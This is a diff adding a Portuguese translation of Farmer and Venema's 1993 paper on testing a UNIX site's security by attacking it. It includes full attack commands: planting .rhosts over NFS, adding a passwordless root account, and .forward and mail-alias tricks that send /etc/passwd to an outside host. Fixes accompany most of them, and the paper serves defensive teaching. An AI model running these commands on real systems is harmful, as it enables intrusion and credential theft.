@@ -1,0 +1,1239 @@
+   ___________________________________________________________________
+  |                                                                   |
+  |  Aumente a segurança de seu site invadindo-o                      |
+  |                                                                   |
+  |                                         Dan Farmer <zen@fish.com> | 
+  |                             Wietse Venema <wietse@wzv.win.tue.nl> | 
+  |                tradução livre por Dr Herman <virtualis@yahoo.com> | 
+  |___________________________________________________________________|
+
+  
+    Improving the Security of Your Site by Breaking Into it
+  
+    Dan Farmer                      Wietse Venema
+
+    Vicious Fishes                  Eindhoven University of Technology
+    1685 Oak Street, #202           P.O. Box 513, 5600 MB
+    San Francisco, CA  94117        Eindhoven, NL
+ 
+    zen@fish.com                    wietse@wzv.win.tue.nl
+
+
+  Introdução
+  ----------
+
+  Todos os dias, no mundo inteiro, redes de computador e servidores
+  estão sendo invadidos. O nível de sofisticação destes ataques variam;
+  enquanto acreditamos que a maioria das invasões ocorrem devido a 
+  senhas fracas, existem um grande número de invasões que utilizam 
+  técnicas muito mais avançadas. Pouco se sabe sobre estes tipos de 
+  invasões porque pela sua natureza são muito difíceis de detectar.
+
+  -----
+
+  CERT.  SRI.  The Nic.  NCSC.  RSA.  NASA.  MIT.  Uunet.  Berkeley.
+  Purdue.  Sun.  Você escolhe, nós já vimos todas serem invadidas. 
+  Qualquer coisa que está na Internet (e muitas que não) parecem ser 
+  jogo fácil. O que estes alvos tem de diferente ? O que aconteceu ?
+
+  ...
+
+  Um jovem, com cabelos louros e engordurados, sentado num quarto 
+  escuro. O quarto é iluminado apenas pela luz da tela de 40 caracteres
+  do C64. Dando outra tragada em seu "Benson and Hedges", o cracker 
+  cansado dá um telnet num site ".mil" de sua lista de alvos. "guest 
+  -- guest", "root -- root" e "system -- manager", tudo falha. Não 
+  importa. Ele tem a noite toda... ele risca o servidor da lista e
+  cansado, digita a próxima vítima em potencial.
+
+  Esta parece ser a imagem popular de um cracker. Jovem, inexperiente,
+  e com muito tempo para gastar, apenas para entrar em mais um sistema.
+  Entretanto, existe uma tipo mais perigoso de cracker. Aquele que 
+  conhece os detalhes da segurança do sistema, ferramentas de cracking,
+  aquele que pode modificá-los para ataques específicos, e que pode 
+  escrever seus próprios programas. Aquele que não apenas lê sobre os 
+  últimos buracos na segurança, mas também descobre bugs e 
+  vulnerabilidades. Uma criatura mortífera que pode atacar e apagar 
+  seus rastros. O uebercracker está aqui.
+
+  -----
+
+  Por que "uebercracker"? A idéia foi roubada, obviamente, de 
+  "uebermensch" de Nietzsche, ou literalmente traduzido para o 
+  português como "super homem" ou "sobre homem". Nietzsche usou o 
+  termo não para se referir ao Superman dos quadrinhos, mas a um homem
+  que foi muito além de sua incompetência, mesquinharia, e fraqueza de
+  um homem comum. O uebercracker é então um cracker que foi muito além
+  das "receitas de bolo" para se invadir sistemas. Um uebercracker 
+  geralmente não é motivado a realizar atos de violência aleatório. Os
+  alvos não são arbitrários -- existe um motivo, seja ele grana, 
+  "pá-pum" por informação, ou um desafio em atacar um maior ou mais 
+  prestigioso site. Um uebercracker é difícil de ser detectado, difícil
+  de ser detido, e o mais difícil de ser mantido longe do seu site para
+  sempre.
+ 
+
+  Visão Geral
+  -----------
+
+  Neste documento teremos uma aproximação diferente sobre segurança de
+  sistemas. Ao invés de simplesmente dizer que algo é um problema, 
+  veremos através dos olhos de um invasor em potencial, e mostraremos 
+  "por que" ele é. Veremos que mesmo aqueles serviços de rede que 
+  parecem inofensivos podem se tornar ferramentas valiosas na procura 
+  de pontos fracos de um sistema, mesmo quando estes serviços estão 
+  funcionando exatamente como deveriam.
+
+  Na tentativa de lançar alguma luz sobre como invasões mais avançadas
+  ocorrem, este artigo descreve vários mecanismos que crackers usam
+  para obter acesso a sistemas e, além disso, algumas técnicas que
+  também suspeitamos que intrusos usam, ou que nós temos usado em 
+  testes ou em ambientes amigáveis ou autorizados.
+
+  Nossa motivação para escrever este artigo é que os administradores
+  de sistema geralmente não tem consciência do perigo representado por
+  ataques diferentes dos mais comuns. Enquanto é do conhecimento de 
+  todos que o nível de proteção depende do que vai ser protegido, 
+  muitos sites parecem não possuir recursos que avaliem qual nível de
+  segurança do servidor de rede é adequado. Ao mostrar o que os 
+  invasores podem fazer para obter acesso a um site remoto, estamos 
+  ajudando os administradores a tomar decisões sobre quão seguro é seu
+  site -- ou não. Limitaremos a discussão a técnicas que dão acesso ao
+  invasor remoto acesso a um processo shell num servidor UNIX. Uma vez 
+  alcançado, os detalhes sobre a obtenção do privilégio de ser root,
+  estão além do escopo deste trabalho -- consideramos isso muito 
+  dependente do ambiente em questão e, em muitos casos, muito banal 
+  para merecer tal discussão.
+
+  Gostariamos de enfatizar que não iremos apenas fazer uma lista de 
+  bugs ou furos de segurança -- sempre existirão novos para um invasor
+  explorar. O objetivo deste artigo é tentar fazer o leitor a olhar 
+  para seu sistema de uma maneira diferente -- que dê oportunidade de 
+  *entender* que seus sistemas podem estar comprometidos, e como.
+
+  Gostariamos de reiterar que ao leitor que o objetivo deste artigo é
+  mostrar como testar a segurança de seu site, e não como invadir o
+  sistema dos outros. As técnicas de invasão que mostramos aqui sempre
+  deixarão rastros nos logs de seu sistema -- pode ser construtivo
+  examiná-los após tentar algum destes ataques para ver como um ataque
+  real parece. Certamente outros sites e administradores de sistema 
+  irão fazer cara feia se você decidir testar a segurança do sistema 
+  sem sua autorização; realmente, é bem possível que ações legais sejam
+  lançadas contra você se eles olharem seus testes como um ataque.
+
+  Existem quatro partes principais no artigo. A primeira parte é a 
+  introdução e a visão geral. A segunda parte tenta dar ao leitor a 
+  sensação de que ele é o invasor que não conhece nada sobre um sistema
+  e que vai "aprendendo" até poder comprometer a segurança. Esta seção 
+  vai além das técnicas reais de como obter informação e acesso e cobre
+  estratégias básicas como exploração da confiança, abuso de serviços
+  de rede mal configurados (ftp, mail, tftp, etc). Também discute
+  brevemente tópicos mais avançados, como NIS e NFS, assim como vários
+  bugs comuns e problemas de configuração que são mais específicos a
+  cada sistema operacional. Estratégias de defesa contra cada um dos
+  ataques também serão vistas aqui.
+
+  A terceira seção lida com confiança: como a segurança de um sistema
+  depende da integridade de outros sistemas. Segurança é o assunto mais
+  complexo deste artigo, e para poupar tempo, iremos limitar a 
+  discussão nos clientes disfarçados.
+
+  A quarta seção cobre os passos básicos que um administrador de 
+  sistemas deve tomar para proteger seu sistema. A maioria dos 
+  métodos apresentados aqui são apenas "bom senso", mas são 
+  freqüentemente ignorados na prática -- um de nossos objetivos é 
+  mostrar o quanto perigoso pode ser ignorar as práticas de segurança 
+  básica.
+
+  Estudo de casos, links para informação relacionada com segurança, e
+  software estão descritos no apêndice no final do artigo.
+
+  Ao explorar os métodos e estratégias discutidas neste artigo, 
+  escrevemos SATAN (Security Analysis Tool for Auditing Networks). 
+  Escrito em shell, perl, expect e C, ele examina um servidor remoto 
+  ou um conjunto de servidores e coleta todas as informações que puder
+  através do NIS, finger, NFS, ftp e tftp, rexd, e outros serviços. 
+  Esta informação inclui a presença de vários serviços de informação de
+  rede assim como possíveis falhas de segurança -- geralmente na forma
+  de um configurações incorretas de serviços de rede, bugs conhecidos 
+  ou utilitários de rede, ou decisões políticas pobres. Ele ainda pode
+  relatar estes dados ou usar um sistema especialista para uma 
+  investigação mais profunda de potenciais problemas de segurança. 
+  Mesmo que SATAN não use todos os métodos discutidos neste artigo, tem
+  sucesso em encontrar várias falhas de segurança em sites Internet. 
+  Ele será colocado a disposição via ftp anônimo quando estiver pronto;
+  o apêndice A cobre suas principais características.
+
+  Veja que não é possível cobrir todos os meios possíveis de se invadir
+  um sistema num único artigo. Realmente, não cobriremos dois dos mais
+  eficazes métodos de invasão: "engenharia social" e "password 
+  cracking". O último é tão eficaz que várias estratégias apresentadas
+  aqui estão envolvidas na obtenção do arquivo de senhas. Além disso,
+  os sistemas de janela (X, OpenWindows, etc) pode fornecer um solo 
+  fértil para exploração, simplesmente não conhecemos muitos métodos 
+  que são usados para invadir sistemas remotos. Muitos crackers usam 
+  terminais de caractere o que impede que sejam utilizados métodos mais
+  interessantes de se explorar sistemas de janela mais eficientemente 
+  (embora ser capaz de monitorar o teclado da vítima seja suficiente 
+  para se capturar senhas). Finalmente, enquanto worms, vírus, cavalos
+  de tróia e outros "malwares" sejam muito interessantes, estes não são
+  muito comuns (em sistemas UNIX) e provavelmente usarão técnicas 
+  similares as que descreviremos nestes artigo com partes individuais 
+  de suas estratégias de ataque.
+
+  Obtendo informação
+  ------------------
+
+  Vamos supor que você seja o principal administrador de sistema da 
+  rede de estações UNIX da "Vítima Ltda". Num esforço de manter em 
+  segurança suas máquinas, você pede a um amigo que é administrador de 
+  um site próximo (mau.com) para dar-lhe uma conta em uma de suas 
+  máquinas para que você possa entrar no seu próprio sistema do lado 
+  de fora.
+
+  O que você deve fazer? Primeiro, tente obter informação sobre seu 
+  servidor (alvo). Existe uma gama de serviços de rede onde olhar: 
+  finger, showmount, e rpcinfo são bons pontos de partida. Mas não pare
+  aí -- você deve também utilizar DNS, whois, sendmail (smtp), ftp, 
+  uucp, e quaisquer outros serviços que encontrar. Existem tantos 
+  métodos e técnicas que não temos espaço suficiente aqui para mostrar 
+  todos, mas tentaremos mostrar as mais comuns e perigosas estratégias 
+  vistas ou pensadas. Idealmente, você deve obter tais informações 
+  sobre todos os servidores da subrede ou área de ataque -- informação
+  é poder -- mas por hora examinaremos apenas o alvo.
+
+  Para começar, veja o que o comando finger mostra (suponha que hoje é
+  6 de novembro de 1993, 6:00 da tarde):
+
+
+  vitima % finger @vitima.com
+
+  [vitima.com]
+  Login       Name             TTY Idle     When    Where
+  zen      Dr.  Fubar           co   1d  Wed 08:00   morte.com
+ 
+
+  Ótimo! Um usuário ocioso -- é provável que ninguém perceberá se você
+  tentar invadir.
+
+  Agora tente outras táticas. Como todo devoto do finger sabe, dar um
+  finger em "@", "0" e "", e nomes comuns como root, bin, ftp, system,
+  guest, demo, manager, etc., pode revelar informações interessantes.
+  O que esta informação é depende da versão do finger que seu alvo
+  esteja rodando, mas o que é notável aqui são os nomes de contas, 
+  junto do nome dos diretórios e da máquina de onde eles se logaram.
+
+  Para conseguir mais informação, você pode usar rusers (em particular
+  com o flag -l) para obter informações úteis sobre usuários logados.
+
+  Usando estes comandos em vitima.com, revela a seguinte informação,
+  apresentada de maneira comprimida para poupar espaço:
+
+
+   Login   Home-dir    Shell      Último login, de onde
+   -----   --------    -----      ----------------------
+   root    /           /bin/sh    Fri Nov 5 07:42 on ttyp1 from grande.vitima.com
+   bin     /bin                   Never logged in
+   nobody  /                      Tue Jun 15 08:57 on ttyp2 from server.vitima.com
+   daemon  /                      Tue Mar 23 12:14 on ttyp0 from grande.vitima.com
+   sync    /           /bin/sync  Tue Mar 23 12:14 on ttyp0 from grande.vitima.com
+   zen     /home/zen   /bin/bash  On since Wed Nov  6 on ttyp3 from morte.com
+   sam     /home/sam   /bin/csh   Wed Nov  5 05:33 on ttyp3 from mau.com
+   guest   /export/foo /bin/sh    Never logged in
+   ftp     /home/ftp              Never logged in
+
+
+  Seja por nossas experiências com o SATAN ou por observar crackers 
+  trabalhando concluímos que finger é um dos serviços mais perigosos 
+  porque é muito útil para investigação de um alvo potencial. De 
+  qualquer forma, muita desta informação é útil apenas quando usada 
+  em conjunto com outros dados.
+
+  Por exemplo, rodando showmount em seu alvo revela:  
+
+
+   mau % showmount -e vitima.com
+   export list for vitima.com:
+   /export                            (everyone)
+   /var                               (everyone)
+   /usr                               easy
+   /export/exec/kvm/sun4c.sunos.4.1.3 easy
+   /export/root/easy                  easy
+   /export/swap/easy                  easy
+  
+  
+  Veja que /export/foo é exportado para o mundo; veja também que este
+  também é o diretório home do usuário guest. Hora de seua primeira
+  invasão! Neste caso, você montará o diretório home do usuário 
+  "guest". Já que você não tem um conta correspondente na máquina local
+  e desde que o root não pode modificar os arquivos num filesystem NFS,
+  você cria uma conta "guest" em seu arquivo de senhas local. Como 
+  usuário guest você pode colocar uma entrada .rhosts no diretório home
+  do usuário guest na máquina remota, que permitirá que você se logue
+  na máquina alvo sem ter que fornecer uma senha.
+
+
+   mau# mount vitima.com:/export/foo /foo
+   mau# cd /foo
+   mau# ls -lag
+   total 3
+      1 drwxr-xr-x 11 root     daemon        512 Jun 19 09:47 .
+      1 drwxr-xr-x  7 root     wheel         512 Jul 19  1991 ..
+      1 drwx--x--x  9 10001    daemon       1024 Aug  3 15:49 guest
+   mau# echo guest:x:10001:1:conta temporaria para invasao:/: >> /etc/passwd
+   mau# ls -lag
+   total 3
+      1 drwxr-xr-x 11 root     daemon        512 Jun 19 09:47 .
+      1 drwxr-xr-x  7 root     wheel         512 Jul 19  1991 ..
+      1 drwx--x--x  9 guest    daemon       1024 Aug  3 15:49 guest
+   mau# su guest
+   mau% echo mau.com >> guest/.rhosts
+   mau% rlogin vitima.com
+  	 Welcome to vitima.com!
+   vitima %
+  
+
+  Se, ao invés de diretórios home, vitima.com estivesse exportando
+  filesystems com o comando (digamos /usr ou /usr/local/bin), você q
+  poderia trocar um comando por um cavalo de tróia que executasse 
+  qualquer comando de sua escolha. O próximo usuário que executasse o
+  comando iria executar seu comando.
+
+  Sugerimos que filesystems seja exportados:
+  - como read/write apenas para clientes específicos e de confiança;
+  - apenas para leitura, onde possível (dados ou programas pode ser
+    exportado desta maneira).
+
+  Se o alvo tem um "+" em seu /etc/hosts.equiv (o que é padrão em 
+  muitas máquinas) ou que tenha o bug netgroups (CERT advisory 91:12),
+  qualquer usuário não-root com um usuário no arquivo de senhas do alvo
+  pode dar um "rlogin" para o alvo sem uma senha. E, posto que o 
+  usuário "bin" geralmente possua arquivos chaves e diretórios, seu
+  próximo ataque será tentar se logar no alvo e modificar o arquivo de
+  senhas para ter acesso ao root:
+
+
+   mau% whoami
+   bin
+   mau% rsh vitima.com csh -i
+   Warning: no access to tty; thus no job control in this shell...
+   vitima %  ls -ldg /etc
+   drwxr-sr-x  8 bin      staff        2048 Jul 24 18:02 /etc
+   vitima %  cd /etc
+   vitima %  mv passwd pw.old
+   vitima %  (echo toor::0:1:instant root shell:/:/bin/sh; cat pw.old ) > passwd
+   vitima % ^D
+   mau% rlogin vitima.com -l toor
+  	 Welcome to vitima.com!
+   vitima #
+  
+  Algumas notas sobre o método usado acima; "rsh vitima.com csh -i" é
+  usado inicialmente entrar no sistema porque ele não deixa nenhum 
+  rastro nos arquivos de auditoria wtmp e utmp, fazendo que o rsh seja
+  invisível para finger e who. O shell remoto não é anexado a um 
+  pseudo-terminal, portanto, programas orientados a tela como 
+  paginadores e editores falharão -- mas isso é muito útil para 
+  explorações rápidas.
+
+  A ferramenta COPS (ver apêndice D) irá mostrar os arquivos chave ou 
+  diretórios que tem permissão de escrita para contas além do 
+  superusuário. Se você estiver executando SunOS 4.x poderá aplicar 
+  qualquer patch 100103 para corrigir a maioria dos problemas de 
+  permissionamento de arquivos. Em muitos sistemas, as explorações rsh
+  como a mostrada acima, mesmo que bem-sucedida, passarão completamente
+  desapercebidas; tcp wrapper (apêndice D), que loga conexões, pode 
+  ajudar a expor tais atividades.
+
+  ----
+
+  E agora? Descobriu todos os buracos no sistema alvo? Não muito. 
+  Retorne aos resultados do comando finger e notará que existe uma 
+  conta "ftp", que significa que o ftp anônimo está habilitado. Ftp 
+  anônimo pode ser um jeito fácil de ganhar acesso, já que geralmente é
+  mal configurado. Por exemplo, o alvo pode ter uma cópia completa do 
+  arquivo /etc/passwd no diretório de ftp anônimo "~ftp/etc" ao invés 
+  de um arquivo vazio. Neste exemplo, isso não parece ser verdade (como
+  você pode dizer isso sem examinar o arquivo?). Entretanto, o 
+  diretório home do ftp em vitima.com tem permissão de escrita. Isso 
+  permite que você execute remotamente um comando -- neste caso, enviar
+  o arquivo de senhas via email para você -- pelo método simples de se
+  criar um arquivo .forward que executa um comando quando algum email é
+  enviado para a conta ftp. Este é o mesmo mecanismo de se "pipear" um
+  email para um programa que o programa "vacation" usa para 
+  automaticamente dar um "reply" nas mensagens que chegam.
+
+
+   mau% cat arquivo_forward
+   "|/bin/mail zen@mau.com < /etc/passwd"
+  
+   mau% ftp vitima.com
+   Connected to vitima.com
+   220 vitima FTP server ready.
+   Name (vitima.com:zen): ftp
+   331 Guest login ok, send ident as password.
+   Password:
+   230 Guest login ok, access restrictions apply.
+   ftp> ls -lga
+   200 PORT command successful.
+   150 ASCII data connection for /bin/ls (192.192.192.1,1129) (0 bytes).
+   total 5
+   drwxr-xr-x  4 101      1             512 Jun 20  1991 .
+   drwxr-xr-x  4 101      1             512 Jun 20  1991 ..
+   drwxr-xr-x  2 0        1             512 Jun 20  1991 bin
+   drwxr-xr-x  2 0        1             512 Jun 20  1991 etc
+   drwxr-xr-x  3 101      1             512 Aug 22  1991 pub
+   226 ASCII Transfer complete.
+   242 bytes received in 0.066 seconds (3.6 Kbytes/s)
+   ftp> put arquivo_forward .forward
+   43 bytes sent in 0.0015 seconds (28 Kbytes/s)
+   ftp> quit
+   mau% echo test | mail ftp@vitima.com
+  
+
+  Agora, basta esperar que o arquivo de senha seja enviado para você.
+
+  A ferramenta de auditoria de segurança COPS checará sua configuração
+  de ftp anônimo; veja a página man para ftpd, a documentação/código
+  para COPS, ou a "CERT advisory" 93:10 sobre informações de como 
+  configurar ftp anônino corretamente. Vulnerabilidades em ftp 
+  geralmente são questões de posse incorreta ou permissionamento de 
+  arquivos chave ou diretórios. Por último, certifique-se que ~ftp e 
+  todo os diretórios "system" e arquivos sob ~ftp são propriedades do 
+  root e não tenham permissão de escrita para nenhum outro usuário.
+
+  Fuçando com o ftp, você pode checar um velho bug que já foi 
+  vastamente explorado:
+
+
+   % ftp -n
+   ftp> open vitima.com
+   Connected to vitima.com
+   220 vitima.com FTP server ready.
+   ftp> quote user ftp
+   331 Guest login ok, send ident as password.
+   ftp> quote cwd ~root
+   530 Please login with USER and PASS.
+   ftp> quote pass ftp
+   230 Guest login ok, access restrictions apply.
+   ftp> ls -al / (or whatever)
+
+
+  Se isso funcionar, você agora estará logado como root e será capaz de
+  modificar o arquivo de senhas ou o que mais quiser. Se seu sistema
+  possui este bug, você deve imediatamente arrangar uma atualização 
+  para o daemon ftp, seja com seu fornecedor ou via ftp anônimo em 
+  ftp.uu.net.
+
+  O ftpd wuarchive, um daemon ftp muito popular criado pela 
+  Universidade de Washington Saint Louis, possui quase o mesmo 
+  problema. Se seu wuarchive ftpd tem data anterior a 8 de abril de 
+  1993, você deve trocá-lo por uma versão mais recente.
+
+  Finalmente, existe um programa vagamente similar ao ftp -- tftp, ou
+  o "trivial file transfer program". Este daemon não precisa qualquer
+  senha para autentificação; se um servidor fornece tftp sem restrições
+  de acesso (geralmente via algum "secure flag" no arquivo inetd.conf),
+  um invasor pode ler e escrever arquivos em qualquer parte de seu
+  sistema. No exemplo, você consegue o arquivo de senhas e o coloca no
+  seu diretório /tmp local.
+
+
+   mau% tftp
+   tftp> connect vitima.com
+   tftp> get /etc/passwd /tmp/passwd.vitima
+   tftp> quit
+
+
+  Por segurança, tftp não deve ser usado; se tftp for necessário, use
+  "secure option/flag" para restringir o acesso a um diretório que não
+  possui informação valiosa, ou utilize-o sob o controle de um programa
+  "chroot wrapper".
+
+
+  ----
+
+
+  Se nenhum dos métodos anteriores funcionou, é hora de medidas mais
+  drásticas. Você encontra um amigo em rpcinfo, outro programa muito
+  útil, às vezes mais útil que finger. Muitos servidores que rodam 
+  serviços RPC podem ser explorados; rpcinfo pode conversar com o 
+  portmapper e mostrar-lhe o caminho. Ele pode dizer-lhe se o servidor
+  está rodando NIS, se é um servidor NIS ou um escravo, se uma estação
+  "diskless" está por perto, se ele está rodando NFS, qualquer serviço
+  de informações (rusersd, rstatd, etc) ou quaisquer outros programas
+  pouco comuns (relacionado com segurança ou auditoria). Por exemplo,
+  voltemos a nosso alvo:
+
+
+   mau% rpcinfo -p vitima.com    [saída resumida para poupar espaço]
+      program vers proto   port
+       100004    2   tcp    673  ypserv
+       100005    1   udp    721  mountd
+       100003    2   udp   2049  nfs
+       100026    1   udp    733  bootparam
+       100017    1   tcp   1274  rexd
+
+
+  Neste caso, você pode ver vários fatos significantes sobre nosso 
+  alvo; primeiro, ele é um servidor NIS. Talvez não seja muito 
+  difundido mas, uma vez que você saiba o nome de domínio NIS de um
+  servidor, você pode conseguir qualquer um dos mapas NIS através de 
+  uma simples requisição rpc, mesmo que você esteja fora da subrede
+  servida pelo servidor NIS (por exemplo, usando o programa YPX que 
+  pode ser encontrado nos arquivos de comp.sources.misc em ftp.uu.net).
+  Além de senhas fáceis, muitos sistemas usam nomes de domínios NIS 
+  fáceis de se adivinhar. Tentar adivinhar o nome de domínio NIS é 
+  geralmente bastante frutífero. Bons candidatos são o nome do
+  servidor ("hostame") completo ou não (eg "vitima" e "vitima.com"),
+  o nome da organização, nomes netgroups na saída do comando 
+  "showmount", e por aí vai. Se você acha que o nome de domínio é
+  "vitima", digite:
+
+
+   mau% ypwhich -d vitima vitima.com
+   Domain vitima not bound.
+
+
+  Esta foi uma tentativa fracassada; se você tivesse acertado, o 
+  comando teria retornado o nome do servidor NIS de "vitima.com". 
+  Entranto, veja que seção NFS que "vitima.com" está exportando o 
+  diretório "/var" para o mundo. Tudo que é necessário é "montar" este
+  diretório e olhar no subdiretório "yp" -- entre outras coisas, você 
+  verá outro subdiretório que contém o nome de domínio do alvo.
+
+
+
+   mau# mount vitima.com:/var /foo
+   mau# cd /foo
+   mau# /bin/ls -alg /foo/yp
+   total 17
+      1 drwxr-sr-x  4 root     staff         512 Jul 12 14:22 .
+      1 drwxr-sr-x 11 root     staff         512 Jun 29 10:54 ..
+     11 -rwxr-xr-x  1 root     staff       10993 Apr 22 11:56 Makefile
+      1 drwxr-sr-x  2 root     staff         512 Apr 22 11:20 binding
+      2 drwxr-sr-x  2 root     staff        1536 Jul 12 14:22 foo_bar
+      [...]
+
+
+
+  Neste caso, "foo_bar" é o nome de domínio NIS.
+
+  Além disso, os mapeamentos NIS geralmente possuem um boa lista de 
+  nomes de usuários/empregados como listas de hosts internos, para não
+  mencionar senhas para "crack".
+
+  O apêndice C detalha o resultado de um caso de estudo de arquivos de
+  senha NIS.
+
+  ----
+
+  Você deve ter observado que a saída de rpcinfo também mostra que
+  vitima.com roda rexd. Como o daemon rsh, rexd processa requisições 
+  como "por favor, execute este comando como se fosse o usuário xxx".
+  De maneira diferente de rshd, rexd não se importa se o cliente está
+  no arquivo hosts.equiv ou .rhost. Normalmente o programa cliente rexd
+  é o comando "ligar", mas ele apenas precisa de um pequeno programa C
+  para enviar informações do cliente e informação sobre o userid para o
+  servidor rexd; rexd executará alegremente o comando. Por estas 
+  razões, executar rexd é como se não existissem senhas: toda 
+  segurança está no cliente, não no servidor (que é onde deveria 
+  estar). A segurança com o rexd pode ser aumentada de alguma maneira
+  usando um RPC seguro.
+
+  ----
+
+  Ao olhar na saída de rpcinfo, você pode observar que vitima.com 
+  também parece ser um servidor para estações "diskless". Isso é 
+  evidenciado pela presença do serviço bootparam, que fornece 
+  informação aos clientes diskless darem o "boot". Se você pedir 
+  educadamente, usando BOOTPARAMPROC_WHOAMI e fornecendo o endereço de
+  um cliente, você pode conseguir o nome de domínio NIS. Isso pode ser 
+  muito útil combinado com o fato que você pode conseguir mapeamentos 
+  NIS (como o arquivo de senhas) quando conhece o nome de domínio NIS.
+  Eis um trecho de programa que faz exatamente isso (bootparam é parte
+  de SATAN).
+
+
+
+    char   *server;
+    struct bp_whoami_arg arg;           /* query */
+    struct bp_whoami_res res;           /* reply */
+ 
+    /* inicializações omitidas... */
+ 
+    callrpc(server, BOOTPARAMPROG, BOOTPARAMVERS, BOOTPARAMPROC_WHOAMI,
+            xdr_bp_whoami_arg, &arg, xdr_bp_whoami_res, &res);
+
+    printf("%s has nisdomain %s\n", server, res.domain_name);
+
+
+
+  A saída de showmount indica que "easy" é um cliente diskless de 
+  vitima.com, então usaremos seu endereço cliente na requisição 
+  BOOTPARAMPROC_WHOAMI:
+
+
+   mau% bootparam vitima.com easy.vitima.com
+   vitima.com has nisdomain foo_bar
+
+
+  ----
+
+  NIS 
+
+  NIS controla os alias de email para o domínio NIS em questão. Assim 
+  como arquivos locais de alias de email, você pode criar um alias de 
+  email que irá executar comandos quando um email for enviado para ele
+  (um exemplo popular é o alias "decode" que "uudecoda" arquivos de 
+  email enviados para ele). Por exemplo, aqui você cria um alias "foo"
+  que envia um email com o arquivo de senhas para mau.com assim que
+  qualquer email seja enviado para ele:
+
+
+
+   nis-master # echo 'foo: "| mail zen@mau.com < /etc/passwd "' >> /etc/aliases
+   nis-master # cd /var/yp
+   nis-master # make aliases
+   nis-master # echo test | mail -v foo@vitima.com
+
+
+  Espero que os invasores não consigam o controle de seu servidor NIS 
+  mestre, e ainda espero que a lição esteja clara -- NIS é normalmente
+  inseguro, mas se um invasor obter o controle de seu NIS mestre, então
+  ele efetivamente terá o controle das máquinas clientes (eg poderá 
+  executar comandos).
+
+  Não existem muitas defesas eficazes contra ataques NIS; ele é um 
+  serviço inseguro em que quase não existe autentificação entre 
+  clientes e servidores. Para piorar as coisas, é bastante claro que 
+  mapas arbitrários podem ser forçados mesmo em servidores mestres (eg,
+  é possível tratar um servidor NIS como um cliente). Isso, obviamente,
+  poderia atrapalhar o esquema inteiro. Se for absolutamente necessário
+  usar NIS, escolher um nome de domínio difícil de adivinhar pode 
+  ajudar um pouco, mas se você rodar clientes diskless que estejam 
+  expostos a invasores então fica fácil invadir usando o truque do 
+  bootparam para conseguir o nome de domínio. Se NIS é usado para 
+  propagar mapas de senhas, então "shadow" não dá proteção adicional 
+  porque o mapa shadow ainda está acessivel para qualquer invasor que 
+  tenha root. Melhor é usar NIS menos possível, ou ao menos entender 
+  que os mapas estão ao alcance de forças hostis.
+
+  RPC seguro diminui em muito o perigo, mas também tem seus problemas,
+  principalmente porque é difícil de administrar, mas também porque
+  os métodos criptográficos usados não são muito fortes. Existem 
+  rumores de que NIS+, um novo serviço de informação de rede da Sun, 
+  corrige alguns problemas, mas até agora está limitado a rodar em 
+  máquinas Sun, e não saiu do papel. Finalmente, usando uma filtragem 
+  de pacotes (pelo menos na porta 111) ou securelib (ver apêndice D), 
+  e para Suns, aplicar o patch 100482-02 inteiro pode ajudar.
+
+
+  ----
+
+
+  O portmapper apenas conhece os serviços RPC. Outros serviços de rede
+  podem ser localizados com um método de força bruta que tenta conectar
+  todas as portas. Muitos utilitários de rede e sistemas de janela 
+  escutam portas específicas (eg sendmail está na porta 25, telnet na 
+  porta 23, X Window geralmente usa a porta 6000, etc). SATAN inclui um
+  programa que vasculha as portas de servidores remotos e mostra o que
+  encontrou; se você rodá-lo contra nosso alvo, verá:
+
+
+  mau% tcpmap vitima.com
+   Mapping 128.128.128.1
+   port 21: ftp
+   port 23: telnet
+   port 25: smtp
+   port 37: time
+   port 79: finger
+   port 512: exec
+   port 513: login
+   port 514: shell
+   port 515: printer
+   port 6000: (X)
+
+
+
+  Isso sugere que vitima.com está rodando X Windows. Se não estiver
+  devidamente protegido (via "magic cookie" ou mecanismos xhost), telas
+  podem ser capturadas e observadas, o que for digitado pode ser visto,
+  programas podem ser executados remotamente, etc. Além disso, se o 
+  alvo estiver rodando X e aceitar telnet na porta 6000, que pode ser 
+  usada para um ataque "denial of service", o servidor poderá travar. 
+  Um método que determina a vulnerabilidade de um servidor X é conectar
+  através da função XOpenDisplay(); se a função retornar NULL, então 
+  você não pode acessar a tela da vítima (opendisplay é parte de SATAN):
+
+
+    char   *hostname;
+
+    if (XOpenDisplay(hostname) == NULL) {
+       printf("Cannot open display: %s\n", hostname);
+    } else {
+       printf("Can open display: %s\n", hostname);
+    }
+
+
+   mau% opendisplay vitima.com:0
+   Cannot open display: vitima.com:0
+
+
+
+  X terminals, muito menos poderosos que um sistema UNIX completo, 
+  podem ter seus próprios problemas de segurança. Muitos X terminals 
+  permitem acesso rsh irrestrito, possibilitando que você inicie 
+  programas no terminal da vitima com a saída aparecendo em sua 
+  própria tela:
+
+
+   mau% xhost +xvitima.vitima.com
+   mau% rsh xvitima.vitima.com telnet vitima.com -display mau.com
+
+
+  Neste caso, planeje a segurança de seu sistema de janelas como seu
+  filesystem e seus utilitários de rede, já que ele pode comprometer
+  seu sistema como um "+" em seu hosts.equiv ou uma conta (root) sem
+  senha.
+
+
+  ----
+
+
+  Agora, examine sendmail. Sendmail é um programa muito complexo que
+  tem uma longa história de problemas com segurança, incluíndo o infâme
+  comando "wiz" (graças a Deus disabilitado em todas as máquinas). Você
+  pode determinar o sistema operacional, e mesmo a versão do alvo,
+  olhando no número de versão retornado pelo sendmail. Isso pode lhe 
+  dar dicas dos possíveis bugs. Além disso, você pode ver se ele roda 
+  o alias "decode", que tem seus próprios problemas:
+
+
+   mau% telnet vitima.com 25
+   connecting to host vitima.com (128.128.128.1.), port 25
+   connection open
+   220 vitima.com Sendmail Sendmail 5.55/vitima ready at Fri, 6 Nov 93 18:00 PDT
+   expn decode
+   250 <"|/usr/bin/uudecode">
+   quit
+
+
+  Rodar o alias "decode" é um risco de segurança -- permite que 
+  potenciais invasores sobrescrevam qualquer arquivo que tiver 
+  permissão para escrita para o dono (owner) -- geralmente o daemon, 
+  mas potencialmente qualquer usuário. Considere este email -- ele 
+  colocará "mau.com" no arquivo .rhosts do usuário zen se tiver
+  permissão para escrita:
+
+
+   mau% echo "mau.com" | uuencode /home/zen/.rhosts | mail decode@vitima.com
+
+
+  Se nenhum diretório home existir ou tiver permissão para escrita, uma
+  variação interessante disso é criar um arquivo /etc/aliases.pag falso
+  que contenha um alias de um comando que você queira executar no seu
+  alvo. Isso deve funcionar, já que em muitos sistemas os arquivos
+  aliases.pag e aliases.dir, que controlam os alias de email, possuem
+  permissão de escrita para todo mundo.
+
+
+   mau% cat decode
+   bin: "| cat /etc/passwd | mail zen@mau.com"
+   mau% newaliases -oQ/tmp -oA`pwd`/decode
